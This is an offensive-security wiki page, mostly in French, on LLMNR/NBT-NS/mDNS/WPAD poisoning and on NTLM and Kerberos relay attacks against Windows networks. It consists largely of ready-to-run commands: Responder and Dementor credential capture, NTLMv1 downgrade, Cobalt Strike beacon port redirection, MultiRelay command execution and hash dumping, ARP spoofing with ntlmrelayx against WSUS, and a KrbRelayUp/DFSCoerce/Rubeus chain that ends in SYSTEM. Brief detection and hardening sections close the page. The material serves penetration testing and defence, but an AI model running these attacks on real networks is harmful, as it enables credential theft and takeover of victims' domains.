# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protocoles réseau

### Protocoles de résolution d'hôtes locaux

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft et d'autres systèmes d'exploitation utilisent LLMNR et NBT-NS pour la résolution de noms locale lorsque DNS échoue. De même, les systèmes Apple et Linux utilisent mDNS.
- Ces protocoles sont vulnérables à l'interception et à l'usurpation en raison de leur nature non authentifiée et de diffusion sur UDP.
- [Responder](https://github.com/lgandx/Responder) et [Dementor](https://github.com/MatrixEditor/Dementor) peuvent être utilisés pour usurper des services en envoyant des réponses falsifiées aux hôtes interrogeant ces protocoles.
- Des informations complémentaires sur l'usurpation de services avec Responder se trouvent [ici](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protocole Web Proxy Auto-Discovery (WPAD)

- WPAD permet aux navigateurs de découvrir automatiquement les paramètres de proxy.
- La découverte se fait via DHCP, DNS, ou en repli via LLMNR et NBT-NS si DNS échoue.
- Responder peut automatiser les attaques WPAD, en dirigeant les clients vers des serveurs WPAD malveillants.

### Responder/Dementor pour l'empoisonnement de protocoles

- **Responder** est un outil utilisé pour empoisonner les requêtes LLMNR, NBT-NS et mDNS, répondant de façon sélective selon les types de requêtes, ciblant principalement les services SMB.
- Il est pré-installé dans Kali Linux, configurable dans `/etc/responder/Responder.conf`.
- Responder affiche les hashes capturés à l'écran et les enregistre dans le répertoire `/usr/share/responder/logs`.
- Il prend en charge IPv4 et IPv6.
- La version Windows de Responder est disponible [ici](https://github.com/lgandx/Responder-Windows).

- **Dementor** étend les sujets d'empoisonnement multicast et agit en outre comme un fournisseur de services rogue (incluant le support CUPS RCE)
- La structure générale est similaire à **Responder** avec une configuration plus granulaire. (le fichier par défaut se trouve ici : [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- La compatibilité entre **Dementor** et **Responder** est indiquée ici : [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Introduction et documentation : [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Corrige des problèmes de capture introduits par Responder sur certains protocoles

#### Exécution de Responder

- Pour lancer Responder avec les paramètres par défaut : `responder -I <Interface>`
- Pour un sondage plus agressif (avec effets secondaires possibles) : `responder -I <Interface> -P -r -v`
- Techniques pour capturer les challenges/réponses NTLMv1 pour faciliter le craquage : `responder -I <Interface> --lm --disable-ess`
- L'usurpation WPAD peut être activée avec : `responder -I <Interface> --wpad`
- Les requêtes NetBIOS peuvent être résolues vers l'IP de l'attaquant, et un proxy d'authentification peut être configuré : `responder.py -I <interface> -Pv`

#### Exécution de Dementor

- Avec les paramètres par défaut : `Dementor -I <interface>`
- Avec les paramètres par défaut en mode analyse : `Dementor -I <interface> -A`
- Abaissement automatique de la session NTLM (ESS) : `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Exécuter la session courante avec une config personnalisée : `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing des réponses DHCP peut empoisonner de façon permanente les informations de routage d'une victime, offrant une alternative plus furtive à l'empoisonnement ARP.
- Cela requiert une connaissance précise de la configuration du réseau cible.
- Lancer l'attaque : `./Responder.py -I eth0 -Pdv`
- Cette méthode peut capturer efficacement des hashes NTLMv1/2, mais nécessite une manipulation prudente pour éviter toute perturbation du réseau.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor usurpent des services en utilisant les protocoles mentionnés ci-dessus, capturant des credentials (généralement NTLMv2 Challenge/Response) lorsqu'un utilisateur tente de s'authentifier contre les services usurpés.
- Des tentatives peuvent être faites pour rétrograder en NetNTLMv1 ou désactiver ESS pour faciliter le craquage des credentials.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Il est crucial de noter que l'utilisation de ces techniques doit se faire légalement et de manière éthique, en obtenant les autorisations appropriées et en évitant toute perturbation ou accès non autorisé.

## Inveigh

Inveigh est un outil pour penetration testers et red teamers, conçu pour les systèmes Windows. Il offre des fonctionnalités similaires à Responder, réalisant des attaques de spoofing et man-in-the-middle. L'outil a évolué d'un script PowerShell vers un binaire C#, avec [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) et [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) comme versions principales. Des paramètres détaillés et des instructions se trouvent dans le [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh peut être exécuté via PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou exécuté en tant que C# binary:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Cette attaque exploite les sessions d'authentification SMB pour accéder à une machine cible, accordant un system shell si elle réussit. Les prérequis clés incluent :

- L'utilisateur authentifiant doit avoir un accès Local Admin sur l'hôte relayé.
- SMB signing doit être désactivé.

#### 445 Port Forwarding and Tunneling

Dans les scénarios où une introduction réseau directe n'est pas faisable, le trafic sur le port 445 doit être redirigé et tunnelisé. Des outils comme [**PortBender**](https://github.com/praetorian-inc/PortBender) aident à rediriger le trafic du port 445 vers un autre port, ce qui est essentiel lorsque l'accès Local Admin est disponible pour le chargement d'un driver.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Autres outils pour NTLM Relay Attack

- **Metasploit** : À configurer avec des proxies, les détails des hôtes locaux et distants.
- **smbrelayx** : Un script Python pour relayer des sessions SMB et exécuter des commandes ou déployer des backdoors.
- **MultiRelay** : Un outil de la suite Responder pour relayer des utilisateurs spécifiques ou tous, exécuter des commandes ou dumper des hashes.

Chaque outil peut être configuré pour fonctionner via un SOCKS proxy si nécessaire, ce qui permet des attaques même avec un accès réseau indirect.

### Fonctionnement de MultiRelay

MultiRelay s'exécute depuis le répertoire _**/usr/share/responder/tools**_, en ciblant des IPs ou des utilisateurs spécifiques.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### RelayKing – découverte de cibles relayables et listes de relais sélectionnées

RelayKing est un **auditeur d'exposition** pour NTLM relay qui cartographie où les relays sont viables et produit des listes de cibles prêtes à l'emploi pour `ntlmrelayx.py -tf`. Il vérifie le durcissement des protocoles (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) et signale les **aides à la coercition/réflexion** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).

- L'authentification améliore la fiabilité des vérifications HTTPS/LDAPS CBT et MSSQL EPA ; le niveau de SMB signing/signature est sondé sans authentification.
- Le routage de relai inter-protocole exploite les découvertes Net-NTLMv1 confirmées (`--ntlmv1`/`--ntlmv1-all`) ; un classement de gravité est fourni par chemin.
- `--gen-relay-list <file>` écrit une liste de cibles compatible grep pour `ntlmrelayx.py -tf <file>` afin d'éviter les essais et erreurs.
- `--coerce-all` déclenche en masse PetitPotam/DFSCoerce/PrinterBug contre toutes les cibles ; `--ntlmv1-all` (RemoteRegistry) et `--audit` (récupération d'hôtes LDAP à l'échelle du domaine) sont **bruyants** et génèrent de nombreuses connexions/accès distants.
- `--proto-portscan` accélère le scan en sautant les ports fermés ; `--krb-dc-only` aide quand les DCs bloquent NTLM mais que d'autres services l'acceptent encore.

Example sweeps:
```bash
# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
--audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
--threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
```
Ces outils et techniques forment un ensemble complet pour effectuer des attaques NTLM Relay dans divers environnements réseau.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

Les clients WSUS s'authentifient auprès de leur serveur de mise à jour en utilisant NTLM over HTTP (8530) ou HTTPS (8531). Lorsque HTTP est activé, les check-ins périodiques des clients peuvent être contraints ou interceptés sur le segment local et relayés avec ntlmrelayx vers des endpoints LDAP/LDAPS/SMB ou AD CS HTTP (ESC8) sans cracker de hashes. Cela se fond dans le trafic de mise à jour normal et donne fréquemment des authentifications de comptes machine (HOST$).

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Sans authentification
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniffer le trafic HTTP WSUS via MITM L2 et consigner les clients/endpoints actifs avec wsusniff.py (HTTP seulement à moins que vous ne puissiez faire en sorte que les clients fassent confiance à votre cert TLS).
- Authentifié
- Analyser les SYSVOL GPOs pour les clés WSUS avec MANSPIDER + regpol (le wrapper wsuspider.sh résume WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirect port 8530 to your relay listener (optional, convenient):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relayer vers SMB (if signing off) pour exec/dump: -t smb://<host>
- Relayer vers LDAPS pour des modifications d'annuaire (p.ex., RBCD): -t ldaps://<DC>
- Relayer vers AD CS web enrollment (ESC8) pour émettre un cert puis s'authentifier via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Déclenchez un check-in client ou attendez le planning. Depuis un client :
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Utilisez les sessions SOCKS authentifiées (si -socks) ou les résultats directs du relay pour le post-exploitation (modifications LDAP, ops SMB, ou émission de certificat AD CS pour une authentification ultérieure).

HTTPS constraint (8531)
- L'interception passive de WSUS over HTTPS est inefficace à moins que les clients ne fassent confiance à votre certificat. Sans un cert de confiance ou une autre rupture TLS, le NTLM handshake ne peut pas être récolté/relayé depuis le trafic WSUS HTTPS.

Notes
- WSUS a été annoncé déprécié mais reste largement déployé ; HTTP (8530) est encore courant dans de nombreux environnements.
- Outils utiles : wsusniff.py (observer les check-ins HTTP WSUS), wsuspider.sh (énumérer WUServer/WUStatusServer depuis les GPOs), NetExec reg-query à grande échelle.
- Impacket a restauré le support de l'écoute HTTP pour ntlmrelayx dans le PR #2034 (initialement ajouté dans le PR #913).

### Forcer les connexions NTLM

Dans Windows vous **pouvez être en mesure de forcer certains comptes privilégiés à s'authentifier auprès de machines arbitraires**. Lisez la page suivante pour apprendre comment :


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** vole un **AP-REQ ticket** d'un service et le réutilise contre un second service qui partage la **même clé de compte-machine** (parce que les deux SPN sont sur le même compte machine se terminant par `$`). Cela fonctionne même si les **classes de service** des SPN diffèrent (p.ex. `CIFS/` → `LDAP/`) parce que la *clé* qui décrypte le ticket est le NT hash de la machine, pas la chaîne SPN elle-même, et la chaîne SPN ne fait pas partie de la signature.

Contrairement au NTLM relay, le saut est limité au *même host* mais, si vous ciblez un protocole qui vous permet de écrire dans LDAP, vous pouvez chaîner vers **Resource-Based Constrained Delegation (RBCD)** ou **AD CS enrollment** et obtenir **NT AUTHORITY\SYSTEM** en une seule opération.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Prouve l'utilisateur auprès du KDC | inchangé |
| **Service ticket / TGS-REQ ↔ REP** | Lié à un **SPN** ; chiffré avec la clé du propriétaire du SPN | interchangeable si les SPN partagent le même compte |
| **AP-REQ** | Le client envoie le `TGS` au service | **ce que nous volons & rejouons** |

* Les tickets sont chiffrés avec la **clé dérivée du mot de passe du compte qui possède le SPN**.
* L'**Authenticator** à l'intérieur de l'AP-REQ a un horodatage de 5 minutes ; la relecture dans cette fenêtre est valide jusqu'à ce que le cache du service voie un doublon.
* Windows vérifie rarement si la chaîne SPN dans le ticket correspond au service que vous attaquez, ainsi un ticket pour `CIFS/HOST` se déchiffre normalement bien sur `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** les SPN source et cible appartiennent au même compte machine (comportement par défaut sur les serveurs Windows).
2. **No channel protection:** SMB/LDAP signing off et EPA off pour HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** vous devez gagner la course avant que le paquet réel n'arrive ou le bloquer entièrement ; sinon le cache de relecture du serveur déclenchera l'Event 4649.
5. Vous devez d'une manière ou d'une autre être capable d'effectuer un **MitM in the communication**, peut-être en faisant partie du groupe DNSAmins pour modifier le DNS du domaine ou en pouvant modifier le fichier HOST de la victime.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Démarrer le relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` regroupe **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** dans un seul binaire.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce force le DC à nous envoyer un ticket Kerberos `CIFS/DC01`.

- 3.4 **Relayer l'AP-REQ**

KrbRelay extrait le GSS blob de SMB, le reconditionne dans un LDAP bind, et le transmet à `ldap://DC01`—l'authentification réussit parce que la **même clé** le déchiffre.

- 3.5 **Abuser LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Vous possédez maintenant **NT AUTHORITY\SYSTEM**.


### **Plus de chemins utiles à connaître**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Le serveur factice envoie une **GSS-ID payload** avec n'importe quel SPN ; le client construit un AP-REQ directement vers vous | Fonctionne même entre sous-réseaux ; machine creds par défaut |
| **DCOM / MSRPC** | Un OXID resolver malveillant force le client à s'authentifier auprès d'un SPN arbitraire et d'un port | Pure *local* priv-esc ; contourne le pare-feu |
| **AD CS Web Enroll** | Relayer le ticket machine vers `HTTP/CA` et obtenir un cert, puis **PKINIT** pour mint des TGTs | Contourne les défenses LDAP signing |
| **Shadow Credentials** | Écrire `msDS-KeyCredentialLink`, puis PKINIT avec une paire de clés forgée | Pas besoin d'ajouter un compte d'ordinateur |

### **Dépannage**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Clé du ticket ≠ clé de la cible | Mauvais host/SPN |
| `KRB_AP_ERR_SKEW` | Horloge > 5 min de décalage | Synchroniser l'heure ou utiliser `w32tm` |
| LDAP bind fails | Binding LDAP échoue (signing enforced) | Utiliser le chemin AD CS ou désactiver le signing |
| Event 4649 spam | Le service a vu un Authenticator dupliqué | Bloquer ou concurrencer le paquet original |


### **Détection**

* Pic d'**Event 4769** pour `CIFS/`, `HTTP/`, `LDAP/` depuis la même source en quelques secondes.
* **Event 4649** sur le service indique qu'un replay a été détecté.
* Connexion Kerberos depuis **127.0.0.1** (relai vers le SCM local) est très suspecte — cartographier via une règle Sigma dans les docs KrbRelayUp.
* Surveiller les modifications des attributs `msDS-AllowedToActOnBehalfOfOtherIdentity` ou `msDS-KeyCredentialLink`.

## **Durcissement**

1. **Enforcer LDAP & SMB signing + EPA** sur chaque serveur.
2. **Séparer les SPN** pour que HTTP ne soit pas sur le même compte que CIFS/LDAP.
3. Patch les vecteurs de coercition (PetitPotam KB5005413, DFS, AuthIP).
4. Fixer **`ms-DS-MachineAccountQuota = 0`** pour empêcher des jonctions de machines non autorisées.
5. Alerter sur **Event 4649** et sur les logons Kerberos loopback inattendus.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)

{{#include ../../banners/hacktricks-training.md}}
